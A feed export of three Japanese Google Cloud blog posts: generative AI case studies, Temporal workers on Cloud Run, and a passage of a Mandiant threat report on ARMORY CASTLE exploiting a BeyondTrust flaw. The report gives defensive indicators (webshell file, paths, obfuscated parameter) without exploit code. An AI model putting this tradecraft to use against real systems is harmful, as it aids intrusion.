    "title": "最新生成 AI 活用事例 121 社を一挙公開！ AI エージェントの本格活用が広がる（2026 年 10 月更新）"
    "link": "https://cloud.google.com/blog/ja/products/ai-machine-learning/latest-examples-of-generative-ai-applications-from-121-companies-released/"
    "published": "2026-10-27 10:00:00"
    "fetched": "2026-10-27 10:09:15"
    "summary": "<div class=\"block-paragraph\"><p>2026 年に入り、AI エージェントの活用・開発環境は大きく変わりました。<b>Gemini 4 Argon</b> や <b>Gemini agent</b> が発表され、<b>Google Antigravity</b> をはじめとするエージェント開発の環境も充実してきました。AI によるコーディングが身近になり、業務で AI エージェントを開発・活用する企業が急増しています。</p><p>作る手段が広がるほど、課題は全社で安全に使い、運用する段階へと移ります。それを支えるのが <b>Google Cloud</b> です。社内データや外部サービスを横断する検索と AI アシスタントに加え、<b>Gemini platform</b> でエージェントの開発から運用、ガバナンスまでをひとつの基盤で管理できます。</p><p>こうした中で、生成 AI は企業の課題解決にどう役立っているのか。Google Cloud では、国内 121 社の最新事例と解決策をまとめた<b>「生成 AI 活用事例集」を 10 月版</b>に更新し、新たに 11 社の事例を加えました。今回追加した事例には、全従業員約 5,000 名への Gemini 導入や、LLM ゲートウェイによる AI の利用状況とコストの管理など、作ったエージェントを全社で使い、運用する段階の取り組みが並びます。ぜひご覧ください。</p><p>▶︎<a href=\"https://cloud.google.com/learn/intl/ja-jp/genai-case-study\">生成 AI 活用事例集（2026 年 10 月版）を無料でダウンロード</a></p><p><b>Gemini Notebook</b> をご活用の方は、<a href=\"https://goo.gle/customer-notebook-jp\" target=\"_blank\">こちらの専用 Notebook</a> もぜひ併せてご覧ください。生成 AI やデータ分析の活用事例を、より深くインタラクティブに探索いただけます。</p><h3><b>10 月版で新しく追加された事例</b></h3><p>メディアから製造業、情報通信まで、生成 AI を実際の業務に取り入れた 11 社の事例を新たに追加しました。</p><ul><li><b>株式会社AbemaTV</b>: 広告代理店からの問い合わせに答える「QA エージェント」と、配信したい内容をもとに最適な広告メニューを選定する「提案エージェント」の 2 つを備えた AI チャットガイドを構築し、Agent Development Kit (ADK) の活用で想定約 3 か月の実装を約 2 か月で実現しました。</li><li><b>株式会社HRBrain</b>: Google Cloud を基盤に、セキュリティ チェックシートへの回答を生成する AI エージェントを開発し、AI が回答の根拠・出典・信頼度を自動で示すことで、専門部署の確認工数を 70% 以上削減しました。</li><li><b>エイベックス株式会社</b>: API を持たないレガシー システムをウェブブラウザ越しに操作する AI エージェントを構築し、ピーク時 1 日約 1,200 件の支払申請を AI が全件一次チェックしたうえで、人間による最終確認との二重体制で安全性と業務効率化を両立しました。</li><li><b>株式会社NTTデータ</b>: Apigee と Google Cloud を組み合わせた LLM ゲートウェイを構築し、クォータ制御や流量制限、Model Armor を用いた入出力のリアルタイム検査によって、組織のガバナンスに準拠した AI 活用を可能にしました。※株式会社NTTデータの見解および実績ではなく、社員個人の技術検証に基づく事例です。</li><li><b>株式会社NTTドコモ</b>: 基幹システムの設計書 1.6 万ファイルを対象とした QA エージェントを、非エンジニア社員が Gemini を活用して約 3 か月で完全内製し、独自のデータ加工で表・図を構造化して正答率 85% を達成しました。</li><li><b>株式会社荏原製作所</b>: 国内従業員のアクティブ ユーザー約 8,000 名が使う社内 AI「EBARA AI Chat」の利用ログを Gemini ベースの AI エージェントが自動分析し、改善レポートを各ナレッジ担当者に配信する仕組みを構築して、AI が適切な回答を提供できているケースを 50% から 72% に増やしました。</li><li><b>GMOペパボ株式会社</b>: Gemini platform を活用し、「直近 3 か月で新規契約が伸びたプランと要因を分析して」と指示するだけで AI が BigQuery 上のデータを自律的に探索・分析する仕組みを構築し、作業時間を平均約 8 時間から約 40 分へ、約 92% 削減しました。</li><li><b>株式会社SUPERNOVA</b>: Google Cloud 上で稼働する生成 AI サービス「Stella AI for Biz」を開発し、議事録作成や AI OCR、スライド生成など、やりたいことを選ぶだけで誰もが AI を使いこなせる仕組みで、中小法人の生成 AI 活用を促進しています。</li><li><b>Ｓｋｙ株式会社</b>: 2026 年 1 月より全従業員約 5,000 名を対象に Gemini Enterprise を導入し、Gemini Notebook を用いた新メンバーの自律学習や Deep Research による社内外情報の横断調査などで活用が進み、定着率 98% を維持しています。</li><li><b>東京システムハウス株式会社</b>: これまで培ってきた COBOL の知見とノウハウを Gemini に組み込んだ「AI ベテランエンジニア」を開発し、仕様書の自動生成や新任エンジニアの質問への回答を通じて、新任エンジニアの開発・運用工数を 30% 削減しました。</li><li><b>Lazuli株式会社</b>: Gemini のマルチモーダル機能を『Lazuli PDP』の商品情報抽出プロセスに導入し、商品画像やカタログ内のテキスト・表から必要な商品属性を構造化データとして自動抽出することで、作業の属人化を解消し、データ精度の均一化を実現しました。</li></ul><h3><b>第 6 回 生成 AI 事例アワード ピッチコンテスト</b></h3><p><a href=\"https://cloudonair.withgoogle.com/events/agentic-ai-summit-26-fall\" target=\"_blank\">AI Agent Summit ’26 Fall</a> では、第 6 回 生成 AI 事例アワードのファイナリストによるピッチ コンテストが行われます。こちらもぜひご参加ください。</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_a21Dh4n.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>"
  "6b7fac71fb9d6e2c69f57f3fffa7382d":
    "id": "6b7fac71fb9d6e2c69f57f3fffa7382d"
    "title": "Cloud Run 上の Temporal Serverless Workers: 需要の変動を見越してワーカーをスケーリング"
    "link": "https://cloud.google.com/blog/ja/products/serverless/temporal-serverless-workers-on-cloud-run-worker-pools/"
    "published": "2026-10-27 11:10:00"
    "fetched": "2026-10-27 22:59:10"
    "summary": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">※この投稿は米国時間 2026 年 10 月 16 日に、Google Cloud blog に</span><a href=\"https://cloud.google.com/blog/products/serverless/temporal-serverless-workers-on-cloud-run-worker-pools?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">投稿</span></a><span style=\"vertical-align: baseline;\">されたものの抄訳です。</span></p>\n<p><span style=\"vertical-align: baseline;\">オープンソースの</span><a href=\"https://temporal.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">Temporal</span></a><span style=\"vertical-align: baseline;\"> 実行プラットフォームは、現代のソフトウェア インフラストラクチャにおける基盤レイヤとして急速に普及しており、特に分散システムや AI エージェント ワークロードのオーケストレーションで真価を発揮しています。しかし、Temporal でワーカーのデプロイやスケーリングを行うには、特有の課題が伴います。ワーカーはリクエストの処理ではなくタスクのポーリングを行うため、リクエスト ドリブンなサーバーレス プラットフォームには適していません。その結果、Kubernetes や VM 上でワーカー フリートを運用せざるを得なくなり、継続的な管理の手間と費用が発生します。指標パイプラインを構築し、自動スケーリングのトリガーをチューニングしても、指標の反映遅延によってスケーリングが急激な負荷に追いつかないことがあります。デプロイごとにアップグレードやバージョンの複雑な管理に追われ、タスクがキューにない状態でもコンピューティング料金を払い続けなければなりません。</span></p>\n<p><span style=\"vertical-align: baseline;\">Google は、まさにこのような pull ベースのタスクのために </span><a href=\"https://docs.cloud.google.com/run/docs/deploy-worker-pools\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run ワーカープール</span></a><span style=\"vertical-align: baseline;\">を開発しました。インスタンスがキューやストリームに接続し、次のアイテムを取り出して処理します。このたび、Temporal のオープンソース プラットフォームのフルマネージド版である </span><a href=\"https://temporal.io/cloud\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Temporal Cloud</span></a><span style=\"vertical-align: baseline;\"> が、これらのワーカープールを自動スケーリングできるようになりました。現在プレビュー版として提供されている Cloud Run 上の </span><a href=\"https://docs.temporal.io/serverless-workers\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Temporal Serverless Workers</span></a><span style=\"vertical-align: baseline;\"> を使用すると、ワーカーをワーカープールとしてデプロイできます。Temporal は、タスクキューの作業量に合わせてプールのサイズを自動調整します。タスクがない場合は、プールをゼロにスケールダウンできます。運用すべきクラスタやオートスケーラーは不要で、既存のワーカーコードもそのまま利用できます。</span></p>\n<h4><strong style=\"vertical-align: baseline;\">Cloud Run ワーカープールと Temporal の連携の仕組み</strong></h4>\n<p><span style=\"vertical-align: baseline;\">ワーカープールは、継続的なバックグラウンド タスクを実行するための Cloud Run リソースです。パブリック エンドポイントを持たず、各インスタンスのライフサイクル全体にわたって CPU が常時割り当てられます。これは Temporal ワーカーの実行モデルと一致しています。Temporal は、Cloud Run ワーカープールを次のように管理します。</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Temporal ワーカーは、プロジェクト内で Cloud Run ワーカープールのインスタンスとして実行され、Temporal Cloud をポーリングしてタスクを取得します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Temporal Cloud は、付与された IAM 権限を使用してタスクキューの状況をトラッキングし、Cloud Run Admin API 経由でワーカープールのインスタンス数を設定します。Temporal がインスタンスへの接続を開くことはないため、ポートを開いたり、ファイアウォール ルールを追加したりする必要はありません。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">ビルドのバージョンごとに、それぞれ独立した Cloud Run ワーカープールとして実行します。古いビルドのワーカープールは、そのビルドで開始されたワークフローで再び処理が必要になるまで、インスタンス数をゼロの状態で待機させることができます。</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Temporal ワーカーは、ご自身のプロジェクト内、サービス アカウント、ネットワーク上で実行されます。Temporal が、その実行数を判断します。</span></p>\n<h4><strong style=\"vertical-align: baseline;\">Temporal Serverless Workers の活用例</strong></h4>\n<p><span style=\"vertical-align: baseline;\">Cloud Run ワーカープールと Temporal Serverless Workers を組み合わせることで、以下のようなさまざまなユースケースが実現します。</span></p>\n<p><strong style=\"vertical-align: baseline;\">自動スケーリングするエージェント ワーカー:</strong><span style=\"vertical-align: baseline;\"> AI エージェントが、LLM の推論とツール呼び出しのマルチステップ チェーンを実行します。ここでは、Temporal の耐久性に優れた実行機能と Cloud Run ワーカープールが効果的に連携します。Temporal ワーカーは即座にスピンアップし、LLM の処理ステップ、エンベディング生成、API 呼び出しなどの急激な負荷を処理したあと、キューが空になると自動でゼロにスケールダウンします。ワーカーは Google Cloud AI API にキーレスでアクセスできます。推論用に GPU をアタッチすることも可能で、その場合でも GPU 付きのワーカーは問題なくゼロまでスケールダウンします。Temporal は、各モデルやツールの呼び出しを耐久性に優れたアクティビティとして実行します。ステップの途中でワーカーが消失した場合でも、アクティビティは別のワーカーで再試行され、ワークフローは継続されます。</span></p>\n<p><strong style=\"vertical-align: baseline;\">長時間実行されるワークフロー:</strong><a href=\"https://docs.temporal.io/workflows\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">Temporal ワークフロー</span></a><span style=\"vertical-align: baseline;\">は無制限に実行し続けることができるため、現実世界のリソース状態を長期間にわたってトラッキングするアプリケーションを構築できます。このパターンは、あるエンティティの状態をワークフローが表すことから、一般に「</span><a href=\"https://docs.temporal.io/design-patterns/entity-workflow%5C\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">エンティティ パターン</span></a><span style=\"vertical-align: baseline;\">」と呼ばれます。しかし、こうした長時間実行されるワークフローでは、常に一定のコンピューティングが必要とされるわけではありません。個々のステップによって処理時間が短いものもあれば長いものもあり、時にはワークフロー自体がスリープして、人間や外部システムからの入力を待機している状態になることもあります。Cloud Run ワーカープールは、このパターンをサポートする柔軟なコンピューティング リソースを提供します。個々のステップは必要な時間だけ実行でき、処理すべきタスクがないときは、Temporal がワーカープールを自動的にスケールダウンします。</span></p>\n<p><strong style=\"vertical-align: baseline;\">バーストバッチ処理:</strong><span style=\"vertical-align: baseline;\"> ワーカープールはインスタンスの実行中にのみ課金されるため、バッチ実行の合間にアイドル状態になっているワーカープールは、インスタンスがゼロの間は費用が発生しません。請求処理やメディアのコード変換といったジョブでは、バッチ処理の到着に合わせて Temporal がプールをスケールアウトし、キューが空になると自動でスケールインします。最大インスタンス数を設定することで、課金対象となるインスタンス数を制限できます。設定した上限を超えるタスクは、ドロップされるのではなく、キューで待機します。</span></p>\n<h4><strong style=\"vertical-align: baseline;\">Temporal ワーカーの実行基盤に Cloud Run ワーカープールを選ぶ理由</strong></h4>\n<p><span style=\"vertical-align: baseline;\">以前は、Cloud Run サービス上で Temporal ワーカーを実行するために、いくつかの回避策を講じる必要がありました。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">HTTP リスナーの実装（Cloud Run サービスは、コンテナが特定のポートでリクエストをリッスンすることを前提としているため）</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">インスタンス単位の課金への変更（リクエスト処理の合間もワーカーが CPU を保持し続けるようにするため）</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">最小インスタンス数の設定（Cloud Run サービスがゼロにスケールダウンしないようにするため）</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Cloud Run ワーカープール上で Temporal ワーカーを実行することで、これらの回避策は不要になり、次のようなメリットが得られます。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">エンドポイントの管理が不要。</strong><span style=\"vertical-align: baseline;\">ロックダウンすべき公開 URL やロードバランサは存在せず、実装が必要なヘルスチェック ポートもありません。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">低料金で安定した CPU。</strong><span style=\"vertical-align: baseline;\">インスタンスはアイドル状態にならず、スロットリングも行われません。Cloud Run はアイドル状態に見えるインスタンスを勝手に削除しないため、プールが縮小するタイミングは Temporal のみが決定します。ワーカープールの料金は、インスタンス課金型の Cloud Run サービスと比較して、vCPU 時間あたりおよび GB 時間あたりで約 40% 安く設定されています。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">リビジョンのチャーンなしでスケーリング。</strong><span style=\"vertical-align: baseline;\">インスタンス数を変更しても新しいリビジョンは作成されないため、Temporal は負荷の変化に応じて頻繁にプールのサイズを変更できます。</span></p>\n</li>\n</ul>\n<h4><strong style=\"vertical-align: baseline;\">Temporal によるワーカープールのスケーリングとバージョニングの仕組み</strong></h4>\n<p><span style=\"vertical-align: baseline;\">Temporal は、タスクがタスクキューのバックログに追加されてからワーカーに取得されるまでの遅延を主要な指標として、リソースを追加するタイミングを判断します。この遅延が大きくなっている場合は、利用可能なワーカーが飽和状態にあります。スケーリングは次のように行われます。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">サーバーサイドの検出:</strong><span style=\"vertical-align: baseline;\"> Temporal サーバーは、タスクキューごとにバックログからワーカー取得までのレイテンシをトラッキングします。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">プッシュ通知:</strong><span style=\"vertical-align: baseline;\"> レイテンシがトリガー条件を超えると、サーバーはワーカー コントローラ インスタンスにプッシュ通知を送信します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">プロビジョニング:</strong><span style=\"vertical-align: baseline;\"> ワーカー コントローラがワーカープールにリソースを追加します。新しいインスタンスが起動して接続し、タスクのポーリングを開始するまでには一定の時間を要するため、リソースの追加はシグナルの検知より遅れて反映されます。</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Temporal は常に予備のリソースを保持しているため、タスクが溜まってから対処するのではなく、需要の増加に先立ちあらかじめプールを拡張します。スケールインはより慎重に行われます。Temporal は、利用可能なワーカーが見つからなかった最後の時点から一定の安定化期間（デフォルトは 90 秒）が経過するのを待ってからスケールインを行い、連続してインスタンスを減らす際にも一定の間隔を空けます。Cloud Run の構成可能な正常シャットダウン機能により、シャットダウン時間が 10 秒から 10 分に延長されます。これにより、SIGTERM に対応したワーカーが処理を完了させるか、チェックポイントを作成するための時間を確保できます。インスタンス数は、設定した最小値から最大値の範囲内に維持されます。アイドル期間後の最初のタスクがインスタンスの起動を待てない場合は、最小値を 1 以上に設定してください。</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_Tu66Q25.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">実行中のワークフローに影響を与えずに新しいコードをデプロイするのは容易ではありません。Temporal ワークフローはステートフルで決定的な挙動をするため、実行途中でコードを差し替えると非決定性エラーが発生します。Cloud Run 上の Serverless Workers は、Temporal ワーカーのバージョニングを必須にすることで、この問題を解決します。条件分岐を使用してコードにパッチを適用する必要はありません。代わりに、各ワーカー デプロイ バージョンは独立したワーカープールとしてデプロイし、</span><code style=\"vertical-align: baseline;\">deploymentName</code><span style=\"vertical-align: baseline;\"> と </span><code style=\"vertical-align: baseline;\">buildId</code><span style=\"vertical-align: baseline;\"> で識別します。個別のワーカープールを使用することで、次の 2 つの問題を解決できます。</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">特定のワーカー デプロイ バージョンで開始されたワークフローは、そのバージョンのまま実行を継続し、完了まで処理されます。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">各ワーカー デプロイ バージョンは個別にスケーリングとドレインが行われるため、コンピューティング費用とリソース利用率をアプリケーションの要件に沿って最適化できます。既存のワークフローが完了して以前のワーカー デプロイ バージョンがドレインされると、基盤となるワーカープールは最終的に自動でゼロにスケールダウンされます。</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">ワークフロー タイプごとにバージョニング動作を設定するか、ワーカーレベルのデフォルトを設定します。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">PINNED:</strong><span style=\"vertical-align: baseline;\"> ワークフローは、開始されたワーカー バージョン（ビルド ID）に固定され、そこで終了します。短時間実行のワークフロー、注文処理、マルチステップ API に最適です。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">AUTO_UPGRADE:</strong><span style=\"vertical-align: baseline;\"> ワークフローのロールアウトに伴い、新しい「現在の」または「ターゲット」ワーカー デプロイ バージョンへと移行します。サブスクリプション請求や数週間に及ぶタスクなど、長時間実行のワークフローに最適です。</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">ワーカー バージョニングの構成の詳細については、</span><a href=\"https://docs.temporal.io/worker-versioning\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">こちら</span></a><span style=\"vertical-align: baseline;\">をご覧ください。</span></p>\n<h4><strong style=\"vertical-align: baseline;\">使ってみる</strong></h4>\n<p><span style=\"vertical-align: baseline;\">セットアップは次の 3 つのステップで行います。</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Temporal ワーカーをコンテナ化し、プール名にビルド ID を含めて Cloud Run ワーカープールとしてコンテナをデプロイします。Temporal API キーなどの認証情報は Secret Manager に保管します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">ワーカープールをスケールできるように、Temporal Cloud に管理権限を付与して、Temporal をワーカープールに接続します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">プールのプロジェクト、リージョン、名前を指定したワーカー デプロイ バージョンを Temporal で作成します。</span></p>\n</li>\n</ol></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/2_GCHxzit.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Cloud Run の Temporal Serverless Workers はプレビュー版であるため、安定版リリースまでに API や構成が変更される可能性があります。利用を開始する方法は次のとおりです。</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://docs.temporal.io/serverless-workers/cloud-run\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run 上の Serverless Workers</span></a><span style=\"vertical-align: baseline;\"> がどのようにスケールし、バージョンを処理するかを理解する。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://docs.temporal.io/production-deployment/worker-deployments/serverless-workers/cloud-run\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">セットアップ ガイド</span></a><span style=\"vertical-align: baseline;\">に沿って、最初のワーカーをデプロイする。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/run/docs/deploy-worker-pools\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run ワーカープール</span></a><span style=\"vertical-align: baseline;\">に関するドキュメントで、CPU、メモリ、GPU、ネットワーキングのオプションを確認する。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">構成可能な正常なシャットダウンの</span><a href=\"https://forms.gle/ctAU6WDUVwJajx1D7\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">プレビュー版</span></a><span style=\"vertical-align: baseline;\">に申し込む。</span></p>\n</li>\n</ul>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">- プロダクト マネージャー、</span><strong style=\"font-style: italic; vertical-align: baseline;\">Sagar Randive</strong></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">- エンジニアリング マネージャー、</span><strong style=\"font-style: italic; vertical-align: baseline;\">Aniruddh Chaturvedi</strong></p></div>"
  "3bd9710fa0c6eee7ec84ab15ff9cbda8":
    "id": "3bd9710fa0c6eee7ec84ab15ff9cbda8"
    "title": "ARMORY CASTLE が BeyondTrust の脆弱性を悪用"
    "link": "https://cloud.google.com/blog/ja/topics/threat-intelligence/armory-castle-exploits-beyondtrust/"
    "published": "2026-10-27 11:00:00"
    "fetched": "2026-10-27 22:59:10"
    "summary": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">※この投稿は米国時間 2026 年 10 月 16 日に、Google Cloud blog に</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-beyondtrust?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">投稿</span></a><span style=\"vertical-align: baseline;\">されたものの抄訳です。</span></p>\n<p><span style=\"vertical-align: baseline;\">執筆者: Jayson Frost、Bryce Greathouse、Brian Meyer、John Palmisano、Rajesh Rajeshirke、Steve Rasch、John Wolfram</span></p>\n<h4><strong style=\"vertical-align: baseline;\">はじめに</strong></h4>\n<p><span style=\"vertical-align: baseline;\">BeyondTrust は 10 月 15 日に、BeyondTrust Remote Support（旧 Bomgar）アプライアンスに影響する脆弱性 CVE-2026-102764 を公表しました。BeyondTrust Remote Support は、IT チームがリモート エンドポイントに安全にアクセスしてトラブルシューティングを行うことができる、エンタープライズ向けのセキュアなリモート アクセス ソリューションです。この脆弱性の悪用に成功すると、任意のファイルをアップロードできます。</span></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant は、インシデント対応において、中国との関連が疑われるサイバースパイ目的の脅威アクターである ARMORY CASTLE（以前は </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign?e=48754805\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">UNC5221</span></a><span style=\"vertical-align: baseline;\"> として追跡）が、2026 年 8 月下旬にこの脆弱性をゼロデイとして悪用した証拠を特定しました。このブログ投稿では、ARMORY CASTLE が CVE-2026-102764 を悪用した後、どのように権限を昇格させ、侵害された BeyondTrust Remote Support アプライアンスへの永続的なアクセスを確立したかを説明し、防御に関する実用的なガイダンスを提供します。</span></p>\n<p><span style=\"vertical-align: baseline;\">ARMORY CASTLE やその他の脅威アクターはこれまで、脆弱性が一般に公表された後に、それを広範囲にわたって日和見的に悪用してきた経緯があるため、組織は脆弱性が明らかになった後に悪用が広がる可能性に備える必要があります。</span></p>\n<h4><strong style=\"vertical-align: baseline;\">脆弱性の悪用</strong></h4>\n<p><span style=\"vertical-align: baseline;\">Mandiant は、access、syslog、messages、thin-scc、brain、SSL の各ログファイルで、CVE-2026-102764 の悪用の痕跡を特定しました。これらのファイルは、</span><code style=\"vertical-align: baseline;\">/home</code><span style=\"vertical-align: baseline;\"> ディレクトリを含む LUKS 暗号化パーティションを介してのみアクセスできるものです。影響を受ける組織は、BeyondTrust が提供するセキュリティ</span><a href=\"https://www.beyondtrust.com/trust-center/security-advisories/bt26-05\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">パッチ</span></a><span style=\"vertical-align: baseline;\">を直ちに適用して脆弱性を修復し、BeyondTrust の</span><a href=\"https://www.beyondtrust.com/blog/entry/bt26-05\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ブログ</span></a><span style=\"vertical-align: baseline;\">で追加のガイダンスを確認することを強くおすすめします。</span></p>\n<h4><strong style=\"vertical-align: baseline;\">侵入後の活動</strong></h4>\n<p><span style=\"vertical-align: baseline;\">Mandiant は、ARMORY CASTLE が CVE-2026-102764 の悪用に成功した後、複数の異なる TTP を利用して足がかりを確立し、権限を昇格させ、ラテラル ムーブメントを可能にしたことを確認しています。ARMORY CASTLE は、侵入全体を通じて、BeyondTrust アプライアンスの内部構造に関する深い知識を利用していました。これは、独自の CLI ユーティリティ、起動構成テンプレート、ローカルのリバース プロキシ ルーティングが悪用されたことからわかっています。脅威アクターは、新たに特定されたカスタム マルウェア、SAWFLY ウェブシェル、BARECLAW トンネラーを使用して、BeyondTrust デバイスを操作していました。また、アクセスを維持して検出を回避するために、アプライアンスのログとエンドポイントのアーティファクトを定期的に削除していました。</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ARMORY CASTLE BeyondTrust compromise sequence of events\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_ARMORY_CASTLE_BeyondTrust_comprom.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>図 1: ARMORY CASTLE による BeyondTrust 侵害における一連のイベント</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">ステージング用のウェブシェル</strong></p>\n<p><span style=\"vertical-align: baseline;\">CVE-2026-102764 の悪用に成功した後、ARMORY CASTLE は </span><code style=\"vertical-align: baseline;\">/app_84304470%2Ephp</code><span style=\"vertical-align: baseline;\"> への POST リクエストを開始しました。Mandiant は、これらの POST リクエストに関連付けられたファイルを復元できませんでした。最初の POST リクエストから約 11 分後に、ウェブ ルートパス </span><code style=\"vertical-align: baseline;\">/%SITE_SERVICE_ACCOUNT%/ingredi/app/laravel/public/</code><span style=\"vertical-align: baseline;\"> に SAWFLY ウェブシェルが作成されたことをファイル システムが記録しています。ARMORY CASTLE は、侵入の過程で、環境内の主要な足がかりの一つとして SAWFLY ウェブシェルを利用していました。</span></p>\n<p><strong style=\"vertical-align: baseline;\">SAWFLY ウェブシェル</strong></p>\n<p><span style=\"vertical-align: baseline;\">SAWFLY（</span><code style=\"vertical-align: baseline;\">mangoapi.php</code><span style=\"vertical-align: baseline;\">）は、難読化された軽量の PHP ウェブシェルで、カスタムの Base32 トランスポート層と 256 ビットの RC4 ストリーム暗号を使用して、双方向の暗号化された C2 通信を実装します。このウェブシェルは、受信する HTTP POST リクエストで、難読化されたパラメータ </span><code style=\"vertical-align: baseline;\">_c94mfe</code><span style=\"vertical-align: baseline;\"> の有無を確認します。</span></p>\n<p><span style=\"vertical-align: baseline;\">パラメータが存在しない場合、スクリプトは直ちに HTTP ステータス「404 